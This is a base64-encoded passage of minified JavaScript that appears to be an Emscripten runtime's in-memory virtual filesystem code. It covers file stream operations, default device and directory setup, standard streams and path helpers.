ZXJyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpfX0KaWYoZmxhZ3MmNTEyKXtGUy50cnVuY2F0ZShub2RlLDApfQpmbGFncyY9figxMjh8NTEyKTt2YXIgc3RyZWFtPUZTLmNyZWF0ZVN0cmVhbSh7bm9kZTpub2RlLHBhdGg6RlMuZ2V0UGF0aChub2RlKSxmbGFnczpmbGFncyxzZWVrYWJsZTohMCxwb3NpdGlvbjowLHN0cmVhbV9vcHM6bm9kZS5zdHJlYW1fb3BzLHVuZ290dGVuOltdLGVycm9yOiExfSxmZF9zdGFydCxmZF9lbmQpO2lmKHN0cmVhbS5zdHJlYW1fb3BzLm9wZW4pe3N0cmVhbS5zdHJlYW1fb3BzLm9wZW4oc3RyZWFtKX0KaWYoTW9kdWxlLmxvZ1JlYWRGaWxlcyYmIShmbGFncyYxKSl7aWYoIUZTLnJlYWRGaWxlcylGUy5yZWFkRmlsZXM9e307aWYoIShwYXRoIGluIEZTLnJlYWRGaWxlcykpe0ZTLnJlYWRGaWxlc1twYXRoXT0xO01vZHVsZS5wcmludEVycigicmVhZCBmaWxlOiAiK3BhdGgpfX0KdHJ5e2lmKEZTLnRyYWNraW5nRGVsZWdhdGUub25PcGVuRmlsZSl7dmFyIHRyYWNraW5nRmxhZ3M9MDtpZigoZmxhZ3MmMjA5NzE1NSkhPT0xKXt0cmFja2luZ0ZsYWdzfD1GUy50cmFja2luZy5vcGVuRmxhZ3MuUkVBRH0KaWYoKGZsYWdzJjIwOTcxNTUpIT09MCl7dHJhY2tpbmdGbGFnc3w9RlMudHJhY2tpbmcub3BlbkZsYWdzLldSSVRFfQpGUy50cmFja2luZ0RlbGVnYXRlLm9uT3BlbkZpbGUocGF0aCx0cmFja2luZ0ZsYWdzKX19Y2F0Y2goZSl7Y29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbXCdvbk9wZW5GaWxlXCddKFwnIitwYXRoKyJcJywgZmxhZ3MpIHRocmV3IGFuIGV4Y2VwdGlvbjogIitlLm1lc3NhZ2UpfQpyZXR1cm4gc3RyZWFtfSksY2xvc2U6KGZ1bmN0aW9uKHN0cmVhbSl7aWYoc3RyZWFtLmdldGRlbnRzKXN0cmVhbS5nZXRkZW50cz1udWxsO3RyeXtpZihzdHJlYW0uc3RyZWFtX29wcy5jbG9zZSl7c3RyZWFtLnN0cmVhbV9vcHMuY2xvc2Uoc3RyZWFtKX19Y2F0Y2goZSl7dGhyb3cgZX1maW5hbGx5e0ZTLmNsb3NlU3RyZWFtKHN0cmVhbS5mZCl9fSksbGxzZWVrOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LHdoZW5jZSl7aWYoIXN0cmVhbS5zZWVrYWJsZXx8IXN0cmVhbS5zdHJlYW1fb3BzLmxsc2Vlayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVNQSVBFKX0Kc3RyZWFtLnBvc2l0aW9uPXN0cmVhbS5zdHJlYW1fb3BzLmxsc2VlayhzdHJlYW0sb2Zmc2V0LHdoZW5jZSk7c3RyZWFtLnVuZ290dGVuPVtdO3JldHVybiBzdHJlYW0ucG9zaXRpb259KSxyZWFkOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24pe2lmKGxlbmd0aDwwfHxwb3NpdGlvbjwwKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfQppZigoc3RyZWFtLmZsYWdzJjIwOTcxNTUpPT09MSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpfQppZihGUy5pc0RpcihzdHJlYW0ubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlTRElSKX0KaWYoIXN0cmVhbS5zdHJlYW1fb3BzLnJlYWQpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CnZhciBzZWVraW5nPSEwO2lmKHR5cGVvZiBwb3NpdGlvbj09PSJ1bmRlZmluZWQiKXtwb3NpdGlvbj1zdHJlYW0ucG9zaXRpb247c2Vla2luZz0hMX1lbHNlIGlmKCFzdHJlYW0uc2Vla2FibGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVTUElQRSl9CnZhciBieXRlc1JlYWQ9c3RyZWFtLnN0cmVhbV9vcHMucmVhZChzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24pO2lmKCFzZWVraW5nKXN0cmVhbS5wb3NpdGlvbis9Ynl0ZXNSZWFkO3JldHVybiBieXRlc1JlYWR9KSx3cml0ZTooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uLGNhbk93bil7aWYobGVuZ3RoPDB8fHBvc2l0aW9uPDApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CmlmKChzdHJlYW0uZmxhZ3MmMjA5NzE1NSk9PT0wKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERil9CmlmKEZTLmlzRGlyKHN0cmVhbS5ub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSVNESVIpfQppZighc3RyZWFtLnN0cmVhbV9vcHMud3JpdGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CmlmKHN0cmVhbS5mbGFncyYxMDI0KXtGUy5sbHNlZWsoc3RyZWFtLDAsMil9CnZhciBzZWVraW5nPSEwO2lmKHR5cGVvZiBwb3NpdGlvbj09PSJ1bmRlZmluZWQiKXtwb3NpdGlvbj1zdHJlYW0ucG9zaXRpb247c2Vla2luZz0hMX1lbHNlIGlmKCFzdHJlYW0uc2Vla2FibGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVTUElQRSl9CnZhciBieXRlc1dyaXR0ZW49c3RyZWFtLnN0cmVhbV9vcHMud3JpdGUoc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uLGNhbk93bik7aWYoIXNlZWtpbmcpc3RyZWFtLnBvc2l0aW9uKz1ieXRlc1dyaXR0ZW47dHJ5e2lmKHN0cmVhbS5wYXRoJiZGUy50cmFja2luZ0RlbGVnYXRlLm9uV3JpdGVUb0ZpbGUpRlMudHJhY2tpbmdEZWxlZ2F0ZS5vbldyaXRlVG9GaWxlKHN0cmVhbS5wYXRoKX1jYXRjaChlKXtjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVtcJ29uV3JpdGVUb0ZpbGVcJ10oXCciK3BhdGgrIlwnKSB0aHJldyBhbiBleGNlcHRpb246ICIrZS5tZXNzYWdlKX0KcmV0dXJuIGJ5dGVzV3JpdHRlbn0pLGFsbG9jYXRlOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LGxlbmd0aCl7aWYob2Zmc2V0PDB8fGxlbmd0aDw9MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX0KaWYoKHN0cmVhbS5mbGFncyYyMDk3MTU1KT09PTApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKX0KaWYoIUZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSYmIUZTLmlzRGlyKHN0cmVhbS5ub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9ERVYpfQppZighc3RyZWFtLnN0cmVhbV9vcHMuYWxsb2NhdGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVPUE5PVFNVUFApfQpzdHJlYW0uc3RyZWFtX29wcy5hbGxvY2F0ZShzdHJlYW0sb2Zmc2V0LGxlbmd0aCl9KSxtbWFwOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24scHJvdCxmbGFncyl7aWYoKHN0cmVhbS5mbGFncyYyMDk3MTU1KT09PTEpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVBQ0NFUyl9CmlmKCFzdHJlYW0uc3RyZWFtX29wcy5tbWFwKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9ERVYpfQpyZXR1cm4gc3RyZWFtLnN0cmVhbV9vcHMubW1hcChzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24scHJvdCxmbGFncyl9KSxtc3luYzooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLG1tYXBGbGFncyl7aWYoIXN0cmVhbXx8IXN0cmVhbS5zdHJlYW1fb3BzLm1zeW5jKXtyZXR1cm4gMH0KcmV0dXJuIHN0cmVhbS5zdHJlYW1fb3BzLm1zeW5jKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxtbWFwRmxhZ3MpfSksbXVubWFwOihmdW5jdGlvbihzdHJlYW0pe3JldHVybiAwfSksaW9jdGw6KGZ1bmN0aW9uKHN0cmVhbSxjbWQsYXJnKXtpZighc3RyZWFtLnN0cmVhbV9vcHMuaW9jdGwpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1RUWSl9CnJldHVybiBzdHJlYW0uc3RyZWFtX29wcy5pb2N0bChzdHJlYW0sY21kLGFyZyl9KSxyZWFkRmlsZTooZnVuY3Rpb24ocGF0aCxvcHRzKXtvcHRzPW9wdHN8fHt9O29wdHMuZmxhZ3M9b3B0cy5mbGFnc3x8InIiO29wdHMuZW5jb2Rpbmc9b3B0cy5lbmNvZGluZ3x8ImJpbmFyeSI7aWYob3B0cy5lbmNvZGluZyE9PSJ1dGY4IiYmb3B0cy5lbmNvZGluZyE9PSJiaW5hcnkiKXt0aHJvdyBuZXcgRXJyb3IoJ0ludmFsaWQgZW5jb2RpbmcgdHlwZSAiXCcrb3B0cy5lbmNvZGluZytcJyInKX0KdmFyIHJldDt2YXIgc3RyZWFtPUZTLm9wZW4ocGF0aCxvcHRzLmZsYWdzKTt2YXIgc3RhdD1GUy5zdGF0KHBhdGgpO3ZhciBsZW5ndGg9c3RhdC5zaXplO3ZhciBidWY9bmV3IFVpbnQ4QXJyYXkobGVuZ3RoKTtGUy5yZWFkKHN0cmVhbSxidWYsMCxsZW5ndGgsMCk7aWYob3B0cy5lbmNvZGluZz09PSJ1dGY4Iil7cmV0PVVURjhBcnJheVRvU3RyaW5nKGJ1ZiwwKX1lbHNlIGlmKG9wdHMuZW5jb2Rpbmc9PT0iYmluYXJ5Iil7cmV0PWJ1Zn1GUy5jbG9zZShzdHJlYW0pO3JldHVybiByZXR9KSx3cml0ZUZpbGU6KGZ1bmN0aW9uKHBhdGgsZGF0YSxvcHRzKXtvcHRzPW9wdHN8fHt9O29wdHMuZmxhZ3M9b3B0cy5mbGFnc3x8InciO29wdHMuZW5jb2Rpbmc9b3B0cy5lbmNvZGluZ3x8InV0ZjgiO2lmKG9wdHMuZW5jb2RpbmchPT0idXRmOCImJm9wdHMuZW5jb2RpbmchPT0iYmluYXJ5Iil7dGhyb3cgbmV3IEVycm9yKCdJbnZhbGlkIGVuY29kaW5nIHR5cGUgIlwnK29wdHMuZW5jb2RpbmcrXCciJyl9dmFyIHN0cmVhbT1GUy5vcGVuKHBhdGgsb3B0cy5mbGFncyxvcHRzLm1vZGUpO2lmKG9wdHMuZW5jb2Rpbmc9PT0idXRmOCIpe3ZhciBidWY9bmV3IFVpbnQ4QXJyYXkobGVuZ3RoQnl0ZXNVVEY4KGRhdGEpKzEpO3ZhciBhY3R1YWxOdW1CeXRlcz1zdHJpbmdUb1VURjhBcnJheShkYXRhLGJ1ZiwwLGJ1Zi5sZW5ndGgpO0ZTLndyaXRlKHN0cmVhbSxidWYsMCxhY3R1YWxOdW1CeXRlcywwLG9wdHMuY2FuT3duKX1lbHNlIGlmKG9wdHMuZW5jb2Rpbmc9PT0iYmluYXJ5Iil7RlMud3JpdGUoc3RyZWFtLGRhdGEsMCxkYXRhLmxlbmd0aCwwLG9wdHMuY2FuT3duKX1GUy5jbG9zZShzdHJlYW0pfSksY3dkOihmdW5jdGlvbigpe3JldHVybiBGUy5jdXJyZW50UGF0aH0pLGNoZGlyOihmdW5jdGlvbihwYXRoKXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiEwfSk7aWYobG9va3VwLm5vZGU9PT1udWxsKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpfWlmKCFGUy5pc0Rpcihsb29rdXAubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUil9dmFyIGVycj1GUy5ub2RlUGVybWlzc2lvbnMobG9va3VwLm5vZGUsIngiKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9RlMuY3VycmVudFBhdGg9bG9va3VwLnBhdGh9KSxjcmVhdGVEZWZhdWx0RGlyZWN0b3JpZXM6KGZ1bmN0aW9uKCl7RlMubWtkaXIoIi90bXAiKTtGUy5ta2RpcigiL2hvbWUiKTtGUy5ta2RpcigiL2hvbWUvd2ViX3VzZXIiKX0pLGNyZWF0ZURlZmF1bHREZXZpY2VzOihmdW5jdGlvbigpe0ZTLm1rZGlyKCIvZGV2Iik7RlMucmVnaXN0ZXJEZXZpY2UoRlMubWFrZWRldigxLDMpLHtyZWFkOihmdW5jdGlvbigpe3JldHVybiAwfSksd3JpdGU6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3Mpe3JldHVybiBsZW5ndGh9KX0pO0ZTLm1rZGV2KCIvZGV2L251bGwiLEZTLm1ha2VkZXYoMSwzKSk7VFRZLnJlZ2lzdGVyKEZTLm1ha2VkZXYoNSwwKSxUVFkuZGVmYXVsdF90dHlfb3BzKTtUVFkucmVnaXN0ZXIoRlMubWFrZWRldig2LDApLFRUWS5kZWZhdWx0X3R0eTFfb3BzKTtGUy5ta2RldigiL2Rldi90dHkiLEZTLm1ha2VkZXYoNSwwKSk7RlMubWtkZXYoIi9kZXYvdHR5MSIsRlMubWFrZWRldig2LDApKTt2YXIgcmFuZG9tX2RldmljZTtpZih0eXBlb2YgY3J5cHRvIT09InVuZGVmaW5lZCIpe3ZhciByYW5kb21CdWZmZXI9bmV3IFVpbnQ4QXJyYXkoMSk7cmFuZG9tX2RldmljZT0oZnVuY3Rpb24oKXtjcnlwdG8uZ2V0UmFuZG9tVmFsdWVzKHJhbmRvbUJ1ZmZlcik7cmV0dXJuIHJhbmRvbUJ1ZmZlclswXX0pfWVsc2UgaWYoRU5WSVJPTk1FTlRfSVNfTk9ERSl7cmFuZG9tX2RldmljZT0oZnVuY3Rpb24oKXtyZXR1cm4gcmVxdWlyZSgiY3J5cHRvIikucmFuZG9tQnl0ZXMoMSlbMF19KX1lbHNle3JhbmRvbV9kZXZpY2U9KGZ1bmN0aW9uKCl7cmV0dXJuIE1hdGgucmFuZG9tKCkqMjU2fDB9KX1GUy5jcmVhdGVEZXZpY2UoIi9kZXYiLCJyYW5kb20iLHJhbmRvbV9kZXZpY2UpO0ZTLmNyZWF0ZURldmljZSgiL2RldiIsInVyYW5kb20iLHJhbmRvbV9kZXZpY2UpO0ZTLm1rZGlyKCIvZGV2L3NobSIpO0ZTLm1rZGlyKCIvZGV2L3NobS90bXAiKX0pLGNyZWF0ZVNwZWNpYWxEaXJlY3RvcmllczooZnVuY3Rpb24oKXtGUy5ta2RpcigiL3Byb2MiKTtGUy5ta2RpcigiL3Byb2Mvc2VsZiIpO0ZTLm1rZGlyKCIvcHJvYy9zZWxmL2ZkIik7RlMubW91bnQoe21vdW50OihmdW5jdGlvbigpe3ZhciBub2RlPUZTLmNyZWF0ZU5vZGUoIi9wcm9jL3NlbGYiLCJmZCIsMTYzODR8NTExLDczKTtub2RlLm5vZGVfb3BzPXtsb29rdXA6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt2YXIgZmQ9K25hbWU7dmFyIHN0cmVhbT1GUy5nZXRTdHJlYW0oZmQpO2lmKCFzdHJlYW0pdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpO3ZhciByZXQ9e3BhcmVudDpudWxsLG1vdW50Onttb3VudHBvaW50OiJmYWtlIn0sbm9kZV9vcHM6e3JlYWRsaW5rOihmdW5jdGlvbigpe3JldHVybiBzdHJlYW0ucGF0aH0pfX07cmV0LnBhcmVudD1yZXQ7cmV0dXJuIHJldH0pfTtyZXR1cm4gbm9kZX0pfSx7fSwiL3Byb2Mvc2VsZi9mZCIpfSksY3JlYXRlU3RhbmRhcmRTdHJlYW1zOihmdW5jdGlvbigpe2lmKE1vZHVsZS5zdGRpbil7RlMuY3JlYXRlRGV2aWNlKCIvZGV2Iiwic3RkaW4iLE1vZHVsZS5zdGRpbil9ZWxzZXtGUy5zeW1saW5rKCIvZGV2L3R0eSIsIi9kZXYvc3RkaW4iKX1pZihNb2R1bGUuc3Rkb3V0KXtGUy5jcmVhdGVEZXZpY2UoIi9kZXYiLCJzdGRvdXQiLG51bGwsTW9kdWxlLnN0ZG91dCl9ZWxzZXtGUy5zeW1saW5rKCIvZGV2L3R0eSIsIi9kZXYvc3Rkb3V0Iil9aWYoTW9kdWxlLnN0ZGVycil7RlMuY3JlYXRlRGV2aWNlKCIvZGV2Iiwic3RkZXJyIixudWxsLE1vZHVsZS5zdGRlcnIpfWVsc2V7RlMuc3ltbGluaygiL2Rldi90dHkxIiwiL2Rldi9zdGRlcnIiKX12YXIgc3RkaW49RlMub3BlbigiL2Rldi9zdGRpbiIsInIiKTthc3NlcnQoc3RkaW4uZmQ9PT0wLCJpbnZhbGlkIGhhbmRsZSBmb3Igc3RkaW4gKCIrc3RkaW4uZmQrIikiKTt2YXIgc3Rkb3V0PUZTLm9wZW4oIi9kZXYvc3Rkb3V0IiwidyIpO2Fzc2VydChzdGRvdXQuZmQ9PT0xLCJpbnZhbGlkIGhhbmRsZSBmb3Igc3Rkb3V0ICgiK3N0ZG91dC5mZCsiKSIpO3ZhciBzdGRlcnI9RlMub3BlbigiL2Rldi9zdGRlcnIiLCJ3Iik7YXNzZXJ0KHN0ZGVyci5mZD09PTIsImludmFsaWQgaGFuZGxlIGZvciBzdGRlcnIgKCIrc3RkZXJyLmZkKyIpIil9KSxlbnN1cmVFcnJub0Vycm9yOihmdW5jdGlvbigpe2lmKEZTLkVycm5vRXJyb3IpcmV0dXJuO0ZTLkVycm5vRXJyb3I9ZnVuY3Rpb24gRXJybm9FcnJvcihlcnJubyxub2RlKXt0aGlzLm5vZGU9bm9kZTt0aGlzLnNldEVycm5vPShmdW5jdGlvbihlcnJubyl7dGhpcy5lcnJubz1lcnJubztmb3IodmFyIGtleSBpbiBFUlJOT19DT0RFUyl7aWYoRVJSTk9fQ09ERVNba2V5XT09PWVycm5vKXt0aGlzLmNvZGU9a2V5O2JyZWFrfX19KTt0aGlzLnNldEVycm5vKGVycm5vKTt0aGlzLm1lc3NhZ2U9RVJSTk9fTUVTU0FHRVNbZXJybm9dfTtGUy5FcnJub0Vycm9yLnByb3RvdHlwZT1uZXcgRXJyb3I7RlMuRXJybm9FcnJvci5wcm90b3R5cGUuY29uc3RydWN0b3I9RlMuRXJybm9FcnJvcjtbRVJSTk9fQ09ERVMuRU5PRU5UXS5mb3JFYWNoKChmdW5jdGlvbihjb2RlKXtGUy5nZW5lcmljRXJyb3JzW2NvZGVdPW5ldyBGUy5FcnJub0Vycm9yKGNvZGUpO0ZTLmdlbmVyaWNFcnJvcnNbY29kZV0uc3RhY2s9IjxnZW5lcmljIGVycm9yLCBubyBzdGFjaz4ifSkpfSksc3RhdGljSW5pdDooZnVuY3Rpb24oKXtGUy5lbnN1cmVFcnJub0Vycm9yKCk7RlMubmFtZVRhYmxlPW5ldyBBcnJheSg0MDk2KTtGUy5tb3VudChNRU1GUyx7fSwiLyIpO0ZTLmNyZWF0ZURlZmF1bHREaXJlY3RvcmllcygpO0ZTLmNyZWF0ZURlZmF1bHREZXZpY2VzKCk7RlMuY3JlYXRlU3BlY2lhbERpcmVjdG9yaWVzKCk7RlMuZmlsZXN5c3RlbXM9eyJNRU1GUyI6TUVNRlMsIklEQkZTIjpJREJGUywiTk9ERUZTIjpOT0RFRlMsIldPUktFUkZTIjpXT1JLRVJGU319KSxpbml0OihmdW5jdGlvbihpbnB1dCxvdXRwdXQsZXJyb3Ipe2Fzc2VydCghRlMuaW5pdC5pbml0aWFsaXplZCwiRlMuaW5pdCB3YXMgcHJldmlvdXNseSBjYWxsZWQuIElmIHlvdSB3YW50IHRvIGluaXRpYWxpemUgbGF0ZXIgd2l0aCBjdXN0b20gcGFyYW1ldGVycywgcmVtb3ZlIGFueSBlYXJsaWVyIGNhbGxzIChub3RlIHRoYXQgb25lIGlzIGF1dG9tYXRpY2FsbHkgYWRkZWQgdG8gdGhlIGdlbmVyYXRlZCBjb2RlKSIpO0ZTLmluaXQuaW5pdGlhbGl6ZWQ9ITA7RlMuZW5zdXJlRXJybm9FcnJvcigpO01vZHVsZS5zdGRpbj1pbnB1dHx8TW9kdWxlLnN0ZGluO01vZHVsZS5zdGRvdXQ9b3V0cHV0fHxNb2R1bGUuc3Rkb3V0O01vZHVsZS5zdGRlcnI9ZXJyb3J8fE1vZHVsZS5zdGRlcnI7RlMuY3JlYXRlU3RhbmRhcmRTdHJlYW1zKCl9KSxxdWl0OihmdW5jdGlvbigpe0ZTLmluaXQuaW5pdGlhbGl6ZWQ9ITE7dmFyIGZmbHVzaD1Nb2R1bGUuX2ZmbHVzaDtpZihmZmx1c2gpZmZsdXNoKDApO2Zvcih2YXIgaT0wO2k8RlMuc3RyZWFtcy5sZW5ndGg7aSsrKXt2YXIgc3RyZWFtPUZTLnN0cmVhbXNbaV07aWYoIXN0cmVhbSl7Y29udGludWV9RlMuY2xvc2Uoc3RyZWFtKX19KSxnZXRNb2RlOihmdW5jdGlvbihjYW5SZWFkLGNhbldyaXRlKXt2YXIgbW9kZT0wO2lmKGNhblJlYWQpbW9kZXw9MjkyfDczO2lmKGNhbldyaXRlKW1vZGV8PTE0NjtyZXR1cm4gbW9kZX0pLGpvaW5QYXRoOihmdW5jdGlvbihwYXJ0cyxmb3JjZVJlbGF0aXZlKXt2YXIgcGF0aD1QQVRILmpvaW4uYXBwbHkobnVsbCxwYXJ0cyk7aWYoZm9yY2VSZWxhdGl2ZSYmcGF0aFswXT09Ii8iKXBhdGg9cGF0aC5zdWJzdHIoMSk7cmV0dXJuIHBhdGh9KSxhYnNvbHV0ZVBhdGg6KGZ1bmN0aW9uKHJlbGF0aXZlLGJhc2Upe3JldHVybiBQQVRILnJlc29sdmUoYmFzZSxyZWxhdGl2ZSl9KSxzdGFuZGFyZGl6ZVBhdGg6KGZ1bmN0aW9uKHBhdGgpe3JldHVybiBQQVRILm5vcm1hbGl6ZShwYXRoKX0pLGZpbmRPYmplY3Q6KGZ1bmN0aW9uKHBhdGgsZG9udFJlc29sdmVMYXN0TGluayl7dmFyIHJldD1GUy5hbmFseXplUGF0aChwYXRoLGRvbnRSZXNvbHZlTGFzdExpbmspO2lmKHJldC5leGlzdHMpe3JldHVybiByZXQub2JqZWN0fWVsc2V7X19fc2V0RXJyTm8ocmV0LmVycm9yKTtyZXR1cm4gbnVsbH19KSxhbmFseXplUGF0aDooZnVuY3Rpb24ocGF0aCxkb250UmVzb2x2ZUxhc3RMaW5rKXt0cnl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzohZG9udFJlc29sdmVMYXN0TGlua30pO3BhdGg9bG9va3VwLnBhdGh9Y2F0Y2goZSl7fXZhciByZXQ9e2lzUm9vdDohMSxleGlzdHM6ITEsZXJyb3I6MCxuYW1lOm51bGwscGF0aDpudWxsLG9iamVjdDpudWxsLHBhcmVudEV4aXN0czohMSxwYXJlbnRQYXRoOm51bGwscGFyZW50T2JqZWN0Om51bGx9O3RyeXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7cGFyZW50OiEwfSk7cmV0LnBhcmVudEV4aXN0cz0hMDtyZXQucGFyZW50UGF0aD1sb29rdXAucGF0aDtyZXQucGFyZW50T2JqZWN0PWxvb2t1cC5ub2RlO3JldC5uYW1lPVBBVEguYmFzZW5hbWUocGF0aCk7bG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiFkb250UmVzb2x2ZUxhc3RMaW5rfSk7cmV0LmV4aXN0cz0hMDtyZXQucGF0aD1sb29rdXAucGF0aDtyZXQub2JqZWN0PWxvb2t1cC5ub2RlO3JldC5uYW1lPWxvb2t1cC5ub2RlLm5hbWU7cmV0LmlzUm9vdD1sb29rdXAucGF0aD09PSIvIn1jYXRjaChlKXtyZXQuZXJyb3I9ZS5lcnJub31yZXR1cm4gcmV0fSksY3JlYXRlRm9sZGVyOihmdW5jdGlvbihwYXJlbnQsbmFtZSxjYW5SZWFkLGNhbldyaXRlKXt2YXIgcGF0aD1QQVRILmpvaW4yKHR5cGVvZiBwYXJlbnQ9PT0ic3RyaW5nIj9wYXJlbnQ6RlMuZ2V0UGF0aChwYXJlbnQpLG5hbWUpO3ZhciBtb2RlPUZTLmdldE1vZGUoY2FuUmVhZCxjYW5Xcml0ZSk7cmV0dXJuIEZTLm1rZGlyKHBhdGgsbW9kZSl9KSxjcmVhdGVQYXRoOihmdW5jdGlvbihwYXJlbnQscGF0aCxjYW5SZWFkLGNhbldyaXRlKXtwYXJlbnQ9dHlwZW9mIHBhcmVudD09PSJzdHJpbmciP3BhcmVudDpGUy5nZXRQYXRoKHBhcmVudCk7dmFyIHBhcnRzPXBhdGguc3BsaXQoIi8iKS5yZXZlcnNlKCk7d2hpbGUocGFydHMubGVuZ3RoKXt2YXIgcGFydD1wYXJ0cy5wb3AoKTtpZighcGFydCljb250aW51ZTt2YXIgY3VycmVudD1QQVRILmpvaW4yKHBhcmVudCxwYXJ0KTt0cnl7RlMubWtkaXIoY3VycmVudCl9Y2F0Y2goZSl7fXBhcmVudD1jdXJyZW50fXJldHVybiBjdXJyZW50fSksY3JlYXRlRmlsZTooZnVuY3Rpb24ocGFyZW50LG5hbWUscHJvcGVydGllcyxjYW5SZWFkLGNhbldyaXRlKXt2YXIgcGF0aD1QQVRILmpvaW4yKHR5cGVvZiBwYXJlbnQ9PT0ic3RyaW5nIj9wYXJlbnQ6RlMuZ2V0UGF0aChwYXJlbnQpLG5hbWUpO3ZhciBtb2RlPUZTLmdldE1vZGUoY2FuUmVhZCxjYW5Xcml0ZSk7cmV0dXJuIEZTLmNyZWF0ZShwYXRoLG1vZGUpfSksY3JlYXRlRGF0YUZpbGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLGRhdGEsY2FuUmVhZCxjYW5Xcml0ZSxjYW5Pd24pe3ZhciBwYXRoPW5hbWU/UEFUSC5qb2luMih0eXBlb2YgcGFyZW50PT09InN0cmluZyI/cGFyZW50OkZTLmdldFBhdGgocGFyZW50KSxuYW1lKTpwYXJlbnQ7dmFyIG1vZGU9RlMuZ2V0TW9kZShjYW5SZWFkLGNhbldyaXRlKTt2YXIgbm9kZT1GUy5jcmVhdGUocGF0aCxtb2RlKTtpZihkYXRhKXtpZih0eXBlb2YgZGF0YT09PSJzdHJpbmciKXt2YXIgYXJyPW5ldyBBcnJheShkYXRhLmxlbmd0aCk7Zm9yKHZhciBpPTAsbGVuPWRhdGEubGVuZ3RoO2k8bGVuOysraSlhcnJbaV09ZGF0YS5jaGFyQ29kZUF0KGkpO2RhdGE9YXJyfUZTLmNobW9kKG5vZGUsbW9kZXwxNDYpO3ZhciBzdHJlYW09RlMub3Blbihub2RlLCJ3Iik7RlMud3JpdGUoc3RyZWFtLGRhdGEsMCxkYXRhLmxlbmd0aCwwLGNhbk93bik7RlMuY2xvc2Uoc3RyZWFtKTtGUy5jaG1vZChub2RlLG1vZGUpfXJldHVybiBub2RlfSksY3JlYXRlRGV2aWNlOihmdW5jdGlvbihwYXJlbnQsbmFtZSxpbnB1dCxvdXRwdXQpe3ZhciBwYXRoPVBBVEguam9pbjIodHlwZW9mIHBhcmVudD09PSJzdHJpbmciP3BhcmVudDpGUy5nZXRQYXRoKHBhcmVudCksbmFtZSk7dmFyIG1vZGU9RlMuZ2V0TW9kZSghIWlucHV0LCEhb3V0cHV0KTtpZighRlMuY3JlYXRlRGV2aWNlLm1ham9yKUZTLmNyZWF0ZURldmljZS5tYWpvcj02NDt2YXIgZGV2PUZTLm1ha2VkZXYoRlMuY3JlYXRlRGV2aWNlLm1ham9yKyssMCk7RlMucmVnaXN0ZXJEZXZpY2UoZGV2LHtvcGVuOihmdW5jdGlvbihzdHJlYW0pe3N0cmVhbS5zZWVrYWJsZT0hMX0pLGNsb3NlOihmdW5jdGlvbihzdHJlYW0pe2lmKG91dHB1dCYmb3V0cHV0LmJ1ZmZlciYmb3V0cHV0LmJ1ZmZlci5sZW5ndGgpe291dHB1dCgxMCl9fSkscmVhZDooZnVuY3R